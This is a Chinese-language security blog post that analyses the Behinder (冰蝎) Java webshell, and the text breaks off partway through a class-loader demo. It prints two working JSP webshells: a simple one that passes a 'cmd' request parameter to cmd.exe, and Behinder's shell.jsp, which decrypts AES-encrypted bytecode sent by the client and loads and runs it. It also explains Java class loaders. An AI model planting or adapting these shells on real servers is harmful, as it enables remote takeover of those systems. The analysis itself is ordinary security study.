---
title: 冰蝎（一）Java Webshell解析
url: https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247500790&idx=1&sn=0fc47e19d4a447d1df46b5a1f6cf86d7&chksm=ce5de197f92a6881106339f5978d0d98e330dd9648376e85ecce7a6a729d84f0fc73ffb98eb6&scene=58&subscene=0#rd
source: Tide安全团队
date: 2022-10-15
fetch_date: 2025-10-03T19:57:15.202596
---

# 冰蝎（一）Java Webshell解析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUibhT4e3KLQ1CKKMT6icu5f0De7ibiavZKkCS43OGAzEYlicZo6mIUGMkwZnI3MDicDN9Hm1NiakRib3npEQ/0?wx_fmt=jpeg)

# 冰蝎（一）Java Webshell解析

原创

zhangy1da

Tide安全团队

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXu3bXekvbOVFvAicpfFJwIOcQOuakZ6jTmyNoeraLFgI4cibKrDRiaPAljUry4dy4e2zK8lUMyKfkGg/640?wx_fmt=png)

# 冰蝎 Java服务端解析

# 前言

看了一段时间的webshell免杀，由于其他语言的webshell没啥基础，只对jsp的webshell和冰蝎简单分析了一下。完成了一个简化版的冰蝎Demo，主要是学习原理，分析的有不对的地方还请师傅们斧正。

# 冰蝎JSP服务端解析

在看冰蝎的shell.jsp之前先来回顾下Java最基础执行命令的实现。Java最常见的是通过Runtime.getRuntime().exec("cmd")来实现执行系统命令的，如下是一个Demo。 Runtime.getRuntime().exec()实现命令执行及输出：

```
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class CMDExecDemo  {
    public static void main(String[] args) throws Exception{
        Process process = Runtime.getRuntime().exec("ipconfig");
        InputStream processInput = process.getInputStream();
        InputStreamReader inputStreamReader = new InputStreamReader(processInput,"GBK");
        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
        String resLine ;
        while ((resLine =bufferedReader.readLine()) != null){
            System.out.println(resLine);
        }
        inputStreamReader.close();
        processInput.close();
    }
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUibhT4e3KLQ1CKKMT6icu5f0esV9iauEyQDsLFUqcicHDP7c7beXjAkuGnMvRd7Vjteic6m2RwiamMTxLA/640?wx_fmt=png "null")

JSP实现：

```
<%@page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"  %>
<%@page import="java.io.*" %>

<%
String os = System.getProperty("os.name").toLowerCase();
out.print(os);

String cmd = request.getParameter("cmd");
String line;
if (cmd != null){
    Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",cmd});
    InputStream ins = p.getInputStream();
    InputStreamReader insr = new InputStreamReader(ins,"GBK");
    BufferedReader br = new BufferedReader(insr);
    out.print("<pre>");
    while ((line = br.readLine()) != null){
        out.print(line+"\n");
    }
    out.print("</pre>");
    ins.close();
    insr.close();
    br.close();
    p.getOutputStream().close();
}
%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUibhT4e3KLQ1CKKMT6icu5f0NiceUTfY4T5IKUmiaqiafRic2H8VcERs2YRwVRxINTSkOpvruibMNQOtaPQ/640?wx_fmt=png "null")

Behinder JSP Webshell不同于一般的一句话木马，作者通过自定义类加载器调用ClassLoader类defineClass方法让服务端有了动态解析字节码的能力，添加注释后的shell.jsp如下。

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!
    //自定义类加载器
    class U extends ClassLoader{
        U(ClassLoader c){
            super(c);
        }
        public Class g(byte []b)
        {
            //调用父类defineClass方法
            return super.defineClass(b,0,b.length);
        }
    }
%>
<%
    if (request.getMethod().equals("POST")){
        String k="e45e329feb5d925b";
        session.putValue("u",k);
        Cipher c=Cipher.getInstance("AES");
        c.init(2,new SecretKeySpec(k.getBytes(),"AES"));

        //获取客户端数据
//        String line = request.getReader().readLine();
        //base64解码客户端数据
//        byte[] b = new sun.misc.BASE64Decoder().decodeBuffer(line);
        //AES解密
//        byte[] b1 = c.doFinal(b);
        //调用父类defineClass方法，将传入数据还原为Class对象
//        U u = new U(this.getClass().getClassLoader());
//        Class clazz = u.g(b1);
        //实例化对象将输出写入pageContext
        //客户端传入的字节码指向的类中重写了equals方法传入pageContext对象，通过pageContext对象
        //可以间接操作response，将执行结果写入response返回给客户端
//        clazz.newInstance().equals(pageContext);
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%>
```

## 关于自定义类加载器

Java执行代码的过程：程序员编写的Java代码通过编译器编译成字节码文件即.class文件之后交由ClassLoader加载至JVM中被执行。 JVM提供了三种类加载器： \*\*Bootstrap classLoader:\*\*主要负责加载核心的类库(java.lang.\*等)，构造ExtClassLoader和APPClassLoader。 **ExtClassLoader**：主要负责加载jre/lib/ext目录下的一些扩展的jar **AppClassLoader**：主要负责加载应用程序的主函数类。 双亲委派机制： 当一个Hello.class这样的文件要被加载时。不考虑自定义类加载器，首先会在AppClassLoader中检查是否加载过，如果有那就无需再加载了。如果没有，那么会拿到父加载器，然后调用父加载器的loadClass方法。父类中同理也会先检查自己是否已经加载过，如果没有再往上。注意这个类似递归的过程，直到到达Bootstrap classLoader之前，都是在检查是否加载过，并不会选择自己去加载。直到BootstrapClassLoader，已经没有父加载器了，这时候开始考虑自己是否能加载了，如果自己无法加载，会下沉到子加载器去加载，一直到最底层，如果没有任何加载器能加载，就会抛出ClassNotFoundException。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RUibhT4e3KLQ1CKKMT6icu5f06q1E8KxENQM3jDiaQMMRcCBfWdib1C9l2X7F7hjKx2Em04xevOjQrJ9A/640?wx_fmt=png "null")

ClassLoader中的三个关键方法： ClassLoader.loadClass()：双亲委派机制的代码实现。

```
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        return loadClass(name, false);
    }

    protected Class<?> loadClass(String name, boolean resolve)
        throws ClassNotFoundException
    {
        synchronized (getClassLoadingLock(name)) {
            // First, check if the class has already been loaded
            Class<?> c = findLoadedClass(name);
            if (c == null) {
                long t0 = System.nanoTime();
                try {
                    if (parent != null) {
                        c = parent.loadClass(name, false);
                    } else {
                        c = findBootstrapClassOrNull(name);
                    }
                } catch (ClassNotFoundException e) {
                    // ClassNotFoundException thrown if class not found
                    // from the non-null parent class loader
                }

                if (c == null) {
                    // If still not found, then invoke findClass in order
                    // to find the class.
                    long t1 = System.nanoTime();
                    c = findClass(name);

                    // this is the defining class loader; record the stats
                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);
                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);
                    sun.misc.PerfCounter.getFindClasses().increment();
                }
            }
            if (resolve) {
                resolveClass(c);
            }
            return c;
        }
    }
```

ClassLoader.defineClass()：将byte[]还原为Class对象。

```
    protected final Class<?> defineClass(String name, byte[] b, int off, int len,
                                         ProtectionDomain protectionDomain)
        throws ClassFormatError
    {
        protectionDomain = preDefineClass(name, protectionDomain);
        String source = defineClassSourceLocation(protectionDomain);
        Class<?> c = defineClass1(name, b, off, len, protectionDomain, source);
        postDefineClass(c, protectionDomain);
        return c;
    }
```

ClassLoader.findClass():供自定义类加载器重写使用，配合defineClass方法实现自定义加载字节码。

```
 protected Class<?> findClass(String name) throws ClassNotFoundException {
        throw new ClassNotFoundException(name);
    }
```

实现自定义类加载器的步骤： 1、继承ClassLoader类 2、重写findClass方法 3、调用defineClass方法 Demo如下： hello.java

```
public class hello {
    public void printHello(){
        System.out.println("hello world!");
    }
}
```

customLoader.java

```
import java.io.File;
import java.io.FileInputStream;
import java.lang.reflect.Method;

public class customLoader extends ClassLoader {
    private String classPath;

    public customLoader(String classPath){
        this.classPath = classPath;
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        byte[] bytes = new byte[0];
        try {
            bytes = loadBytes(name);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return super.defineClass(bytes,0,bytes.length);
    }

    private byte[] loadBytes(String className) throws Exception{
        FileInputStream fileIns = new FileInputStream(classPath+ File.separator+className.replace(".",File.separat...